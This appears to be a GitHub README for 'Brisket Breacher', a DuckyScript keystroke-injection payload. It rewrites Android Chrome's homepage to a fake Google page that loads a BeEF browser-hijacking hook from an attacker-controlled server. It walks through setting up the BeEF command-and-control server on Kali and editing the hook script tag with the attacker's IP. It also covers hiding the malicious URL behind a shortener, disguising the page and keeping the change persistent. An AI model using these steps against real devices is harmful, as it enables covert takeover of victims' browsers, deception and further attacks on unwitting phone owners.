<div align="center">
  
# Brisket Breacher

![bb](https://github.com/user-attachments/assets/019730d7-db7d-4a9a-a892-06df2b390adc)

</div>

**Title:** Brisket_Breacher

**Author:** OSINTI4L

**Target Os:** Android mobile device/Google Chrome (tested on Samsung S24 FE | One UI V7.0 | Android V15).

## What is Brisket Breacher?

Brisket Breacher is DuckyScript payload that targets the Android mobile device Google Chrome browser utilizing the Browser Exploitation Framework ([BeEF](https://www.kali.org/tools/beef-xss/)). The payload changes the homepage of the Google Chrome browser to an imitation `Google.com` landing page. When a victim device opens the Google Chrome browser to the homepage, the imitation Google.com page points to a BeEF command and control server via a Javascript BeEF hook, where the attacker has direct control over the browser to allow for further attacks. For the attack to work, the attacker must setup a BeEF C2 server, configure the homepage, and edit the URL to the C2 in the payload.txt (all explained below).

For the purposes of this PoC the BeEF C2 will be hosted locally over LAN, where the attacker machine and target device must be on the same LAN for the attack to be succesful. The same attack can be used outside of LAN if setup via methods such as port forwarding or hosting services.

**Persistence**

Due to the payload changing the homepage in the settings of the Google Chrome browser, this creates persistence. *Even* if the phone is restarted, when the browser homepage is loaded, it will *always* attempt to connect to the BeEF C2.

## Dependencies
## Setting up the BeEF command and control server using a [Kali Linux](https://www.kali.org) box
1. Once you have spun-up an instance of Kali (our attacker machine), you must first find the IP address of the machine. This can be found via `ifconfig`, store the IP address as it will be needed in multiple places momentarily.
  
2. Install BeEF:
    - `sudo apt install beef-xss -y`
     
3. Download the homepage.html file in the Brisket_Breacher directory (described next). This will be the homepage that our malicious URL will point to and deliver the BeEF C2 hook.
    - Open the homepage.html and edit the BeEF C2 hook (line 141 `<script src="http://X.X.X.X:3000/hook.js"></script>`) with the IP address gathered from `ifconfig` of the attacker machine and then save the updated file. E.g., `<script src="http://192.168.8.100:3000/hook.js"></script>`.
    - Become root: `sudo su`.
    - With the homepage.html file in your current working directory, move it to the following directory: `mv homepage.html /usr/share/beef-xss/extensions/demos/html`.

4. Start BeEF:
    - `sudo beef-xss`.

## The homepage
The homepage was designed to imitate a typical Google Search landing page. Multiple features were added in an attempt to help obfuscate the fact that it is a *malicious* homepage. The homepage also delivers the BeEF C2 hook.
  - Features:
    - BeEF C2 hook delivery.
    - Dark and Light mode variations that will render according to device settings.
    - A useable search bar and buttons that will forward the user input as a Google search request.

![googlesearch](https://github.com/user-attachments/assets/1a428553-52d5-417b-aabb-5fc053c33ea8)

## payload.txt
The payload.txt file is the delivery system for configuration of the Google Chrome browser.

**The URL pointing to the BeEF C2 must be defined in line 7 of the payload.txt.** The URL to the BeEF C2 is the following: `http://x.x.x.x:3000/demos/homepage.html` (replacing the IP parameter with the IP address of the attacker machine). E.g., `http://192.168.8.100:3000/demos/homepage.html`. This will point to the homepage.html file that has been previously configured during the BeEF C2 setup stage.

An additional layer of obfuscation can be had by utilizing a URL shortening service (e.g., [Tinyurl](https://tinyurl.com/)). After placing the `http://x.x.x.x:3000/demos/homepage.html` URL into the shortener, you will then use the shortened URL as the constant defined in line 7.

The payload workflow is as follows:
  - Chrome browser is opened.
  - A new tab is opened to ensure the proper browser environment is present for the script to run without issues.
  - The browser is then navigated to the settings menu where the malicious BeEF C2 URL is placed.
  - All tabs are then closed.
  - All applications are then closed and the phone returns to the home screen. This is necessary for obfuscation purposes and to allow the browser to automatically navigate to the malicious homepage when opened.

![demo](https://github.com/user-attachments/assets/89d853d8-ec2c-4ca9-9cee-46ca4f33aab6)
